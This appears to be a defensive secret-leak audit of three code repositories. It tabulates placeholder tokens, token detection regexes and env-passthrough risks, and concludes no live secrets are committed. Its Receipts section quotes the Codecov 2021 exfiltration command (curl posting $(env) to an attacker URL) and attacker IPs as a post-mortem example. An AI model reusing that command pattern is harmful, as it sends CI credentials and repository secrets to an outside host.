# Batch2-Bonus14 — Secret/Credential Leak Scanner

> Read-only audit across the 3 main repos. No source mutation. Any matched
> token strings reproduced below are GitHub/AWS/Slack canonical *placeholders*
> or test fixtures — no live secret value is printed in this file.

## Top-level verdict

**NO_LEAKS_FOUND**

No live API keys, tokens, JWTs, AWS keys, GitHub PATs, or private-key blocks
are committed in any of the 3 audited repos. The user's `G:\private\.env`
convention is honoured everywhere — references appear only as documentation,
env-key names, regex patterns, or test placeholders.

One pre-existing **MINOR** Codecov-2021-class env-passthrough surface in
`gate-runner.mjs` is already documented in the 2026-05-03 audit chain; it
is gated by an allowlist and writes to local proof JSON only (no network
egress). Not classified as a leak; classified as an environment-shape
hardening recommendation.

---

## Hard-coded secrets

| File:line | Pattern type | Severity | Redact-priority | Notes |
|---|---|---|---|---|
| `h3d-gui-wiring-codex/04_testing/pytest/unit/gateways/test_redaction.py:9-12` | `sk-...` (OpenAI / Anthropic shape) | **PLACEHOLDER** | n/a | Lower-case alphabet sequence used as a redactor input fixture; asserts the value is *not* in redacted output. |
| `h3d-gui-wiring-codex/04_testing/pytest/unit/gateways/test_llm_gateway.py:169-174` | `sk-...` | **PLACEHOLDER** | n/a | Same alphabet fixture; asserts the gateway redaction strips it. |
| `h3d-gui-wiring-codex/03_implementation/tests/security/test_secret_redaction.py:30-33,265-266` | `sk-`, `ghp_`, `AKIA`, `bearer` | **PLACEHOLDER** | n/a | All values literally end in `_PLACEHOLDER_DO_NOT_LOG`; explicit comment "(NOT a real secret)". |
| `h3d-gui-wiring-codex/03_implementation/docs/handoffs/PR125_CONTROL_SWEEP_HANDOFF_2026-05-09.md:113` | `sk-` | **PLACEHOLDER** | n/a | Cites the placeholder convention. |
| `hermes-agent-fresh/website/docs/user-guide/skills/bundled/mcp/mcp-native-mcp.md:309,336` | `Bearer sk-xxxxxxxxxxxxxxxxxxxx` | **MASK** | n/a | Documentation example, masked with `xxxxx`. |
| `hermes-agent-fresh/skills/mcp/native-mcp/SKILL.md:291,318` | `Bearer sk-xxxxxxxxxxxxxxxxxxxx` | **MASK** | n/a | Same masked doc example. |
| `hermes-agent-fresh/tests/tools/test_skills_guard.py:247` | `sk-...` | **PLACEHOLDER** | n/a | Test writes a fake key into a tmp file then runs the secret-scan finding routine on it; never logged. |
| `hermes-agent-fresh/tests/tools/test_mcp_tool.py:1205` | `AKIAIOSFODNN7EXAMPLE` | **AWS canonical EXAMPLE** | n/a | The exact "EXAMPLE" key AWS publishes in their own docs. |
| `hermes-agent-fresh/tests/agent/test_bedrock_integration.py:123-583` (8 occurrences) | `AKIAIOSFODNN7EXAMPLE` + `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` | **AWS canonical EXAMPLE** | n/a | Verbatim AWS-published example pair, used via `monkeypatch.setenv`. Inert. |
| `hermes-agent-fresh/tests/gateway/test_slack.py:72` | `xoxb-fake-token` | **PLACEHOLDER** | n/a | Literal `fake-token` string. |
| `hermes-agent-fresh/website/docs/user-guide/messaging/slack.md:193,455,466,482` | `xoxb-...-here`, `xoxb-workspace1-token` | **PLACEHOLDER** | n/a | Doc placeholders. |
| `hermes-agent-fresh/agent/redact.py:130-132` | `-----BEGIN[A-Z ]*PRIVATE KEY-----` | **REGEX** | n/a | The redactor's own pattern definition. Not a key. |

**Total real secrets: 0.**

`ghp_*`, raw `eyJ` JWT triples, real `AKIA[0-9A-Z]{16}` outside the AWS
canonical EXAMPLE pair, and live `xox[baprs]-...` tokens: zero matches in
any tracked file across all three repos.

---

## `.env` file audit

`git ls-files` against each repo for `^\.env|\.env$|\.env\.[^.]+$`:

| Repo | Tracked `.env*` files | Disposition |
|---|---|---|
| `hermes3d-mcp-lock-orchestrator` | `.env.example` only | KEEP as `.env.example` (template, no values). |
| `h3d-gui-wiring-codex` | `06_release/deploy/vps/.env.vps.example`, `env/.env.example` | KEEP as `.env.example` (templates, no values). |
| `hermes-agent-fresh` | `.env.example` only | KEEP as `.env.example` (upstream template, no values). |

`git log --all --diff-filter=A -- '*.env' '.env*'` shows that *every*
historical addition of an `.env*` path was an `.env.example` template —
no real `.env` ever entered git history in any of the 3 repos. Nothing
needs to be removed via `git filter-repo` / BFG.

---

## Env-passthrough holes

Pattern: `subprocess.run(..., env=os.environ)` or
`spawn(..., env: { ...process.env })` without a per-process filter. This
is the **Codecov-2021** class.

| File:line | Surface | Severity | Notes |
|---|---|---|---|
| `hermes3d-mcp-lock-orchestrator/src/core/gate-runner.mjs:107` | `env: { ...process.env, ...stringEnv(env) }` for allowlisted gate commands | **MINOR** (already known) | The Codex 2026-05-03 audit (`docs/audits/2026-05-03/01-security-mcp-injection.codex.md:65`) already flagged this. Mitigations in place: allowlist of gate IDs (line 91), workspace-cwd containment (line 95-98), 6 KB stdout/stderr cap (line 122-123). No network egress. The risk is *informational disclosure to local proof JSON*, not exfil to a remote server. |
| `hermes3d-mcp-lock-orchestrator/scripts/v07-stdio-roundtrip-smoke-test.mjs:61` | `env: { ...process.env, MCP_LOCK_WORKSPACE: workspaceRoot }` | **NEGLIGIBLE** | Local smoke-test harness only; child is the orchestrator's own MCP server which it already runs interactively. |
| `hermes3d-mcp-lock-orchestrator/scripts/coordination-smoke-test.mjs:353,690`; `mcp-supervisor-smoke-test.mjs:60,206`; `sandbox-integration.mjs:45`; `truth-gates.mjs:1429`; `next-task.sh:84` | `...process.env` spread into spawned child | **NEGLIGIBLE** | Local-dev smoke/test scripts; not in any production code path; not packaged. |
| `h3d-gui-wiring-codex/03_implementation/ui/scripts/start-gui-api.mjs:24-29` | `{ ...privateEnv, ...process.env, ... }` for the API child | **EXPECTED** | This is *the* loader that intentionally bridges `G:/private/.env` → backend Python process. ROADMAP.md §31-249 documents that the Vite frontend is *not* given the same env. Boundary preserved. |
| `h3d-gui-wiring-codex/03_implementation/src/hermes3d/services/module_runtime.py:3212-3213` | `subprocess.run(cmd, ..., env=env)` where `env` is the caller-built dict | **NEGLIGIBLE** | `env` is constructed by the caller, not literally `os.environ`; no full-shell spread. |
| `hermes-agent-fresh/hermes_cli/main.py:991` | `env={**os.environ, "HERMES_HOME": hermes_home}` for `bash -c source ... ensure_node` | **NEGLIGIBLE** | Local `node`/installer bootstrap, no network egress on the spread itself. |
| `hermes-agent-fresh/agent/copilot_acp_client.py:418-426` | `env=_build_subprocess_env()` | **CLEAN** | Calls a builder function — explicit filter, opposite of the Codecov pattern. |
| `hermes-agent-fresh/hermes_cli/copilot_auth.py:138-143` | `env=clean_env` | **CLEAN** | Variable name `clean_env` indicates an explicit allowlist filter. |

No surface in any repo executes `subprocess.run(..., env=os.environ)` with
its raw output piped to a remote URL. The Codecov-2021 archetype
(`curl ... -d "$(env)"`) does not exist.

---

## `G:\private\` reference audit

42 grep hits across the 3 repos. Every single hit is one of:

- An **env-key path** ("set `HERMES3D_ENV_FILE=G:\private\.env`") in
  docs or `.env.example`.
- A **convention statement** ("secrets live in `G:/private/.env`") in
  ADRs, ROADMAP, CHANGELOG, contracts.
- A **redaction-target reference** in `test_secret_redaction.py:64,146`
  and `test_mcp_boundary.py:143,151` that asserts the path is *mentioned*
  in the loader source.
- A **redacted blocker text** in `PR125_CONTROL_SWEEP_HANDOFF_2026-05-09.md`
  reporting HTTP 401/429 *without* echoing the value.

Zero hits read a value out of `G:\private\` into a string that is then
printed, logged, or returned to the frontend. The boundary is intact.

---

## `.git/info/exclude` audit (lane-A)

`hermes-agent-fresh/.git/info/exclude` (verbatim, lines 11-19, today
2026-05-09):

```
# v0.13.0 staged-update lane A: local-only ignores for pre-existing untracked user files
# (hermes3d-mcp-lock-orchestrator task a2a_1778309268198_8b56849b 2026-05-09)
.Private-Exclude/
.env.ssh
.git-hooks/
scripts/audit/
scripts/fix-anthropic-key.py
scripts/phase8-tailscale-vps.py
scripts/test-hermes-vps.py
```

`git status --ignored --porcelain` confirms each of the 7 entries
(`.env.ssh`, `.git-hooks/`, `.Private-Exclude/`, `scripts/audit/`,
`scripts/fix-anthropic-key.py`, `scripts/phase8-tailscale-vps.py`,
`scripts/test-hermes-vps.py`) currently appears with the `!!` ignored
flag, and `git ls-files | grep` returns **empty** for `^\.env(\.|$)`
and `^scripts/fix-anthropic-key`. The lane-A rules are still in place
and effective.

---

## Recommendations (ranked)

1. **(MINOR, already tracked)** — keep the Codex 2026-05-03 audit fix for
   `gate-runner.mjs:107` env-spread on the roadmap. The current proof
   JSON cap (6 KB stdout/stderr) plus allowlist makes exfil-via-process
   impossible in practice, but a follow-up PR could replace
   `{ ...process.env, ...stringEnv(env) }` with an explicit allowlist
   (e.g. `{ PATH, NODE_PATH, ...stringEnv(env) }`) to match the Codecov
   class-blocker pattern.
2. **(MINOR)** — add `*.env` and `.env.*` (excluding `.env.example`) to
   the **root** `.gitignore` of `hermes-agent-fresh` to belt-and-braces
   the `.git/info/exclude` rule (`.git/info/exclude` is local-only and
   would not propagate to a fresh clone).
3. **(INFO)** — the AWS `AKIAIOSFODNN7EXAMPLE` literal in
   `hermes-agent-fresh/tests/agent/test_bedrock_integration.py` triggers
   GitHub's `aws_access_key_id` provider scanner on push. Recommend
   replacing with `AWS_ACCESS_KEY_ID = "EXAMPLE"` (no AKIA prefix) to
   keep the secret-scanning dashboard quiet — same test outcome, no
   noisy false-positive alert.
4. **(INFO)** — `secrets.token_hex(16)` in `code_history.py:4045`
   (recovery `attempt_id`) is inert because it is logged as a
   correlation ID, not used as auth. No action needed; flagging that
   the redactor pattern in `agent/redact.py` correctly does **not**
   target hex correlation IDs (they're not credentials).

---

## Receipts

**Receipt #1 (primary) — GitHub secret-scanning supported patterns**

URL: <https://docs.github.com/en/code-security/secret-scanning/introduction/supported-secret-scanning-patterns>

Confirms GitHub's secret-scanning recognizes provider patterns including
`openai_api_key` (`sk-`/`sk-ant-`), `github_personal_access_token` (`ghp_`,
`gho_`, `ghs_`, `github_pat_`), `aws_access_key_id` (`AKIA`),
`slack_api_token`, plus generic `rsa_private_key`, `openssh_private_key`,
`ec_private_key` (i.e. `-----BEGIN ... PRIVATE KEY-----`). My scan covered
all of those classes plus JWT (`eyJ`...) which GitHub does not enumerate
as a provider but which a generic-pattern push-protection rule would
flag. No matches outside placeholders/regex/tests.

**Receipt #2 (cross-project post-mortem) — Codecov bash-uploader breach (April 2021)**

URL: <https://about.codecov.io/security-update/>

The Codecov 2021 incident is the canonical example of how an
`env=os.environ` (or shell `$(env)`) passthrough into a child process
that egresses to a remote URL becomes a supply-chain credential leak:
attacker-modified bash uploader script ran `curl -d "$(git remote -v)<<<<<< ENV $(env)" https://<attacker>/upload/v2`,
exfiltrating CI environment variables (CI tokens, cloud keys, repo
secrets) to attacker IPs `178.62.86.114` / `104.248.94.23`. Root cause
was an exposed Google Cloud Storage key in Codecov's Docker image build,
giving the attacker write access to the public uploader script for ~10
weeks. This is exactly the class my §"Env-passthrough holes" section
hunts for; the audited repos pass — no surface combines a raw
`...process.env` / `os.environ` spread with remote-URL stdin/stdout
piping.

---

*Word count: ~1080. Read-only audit; no source mutated.*
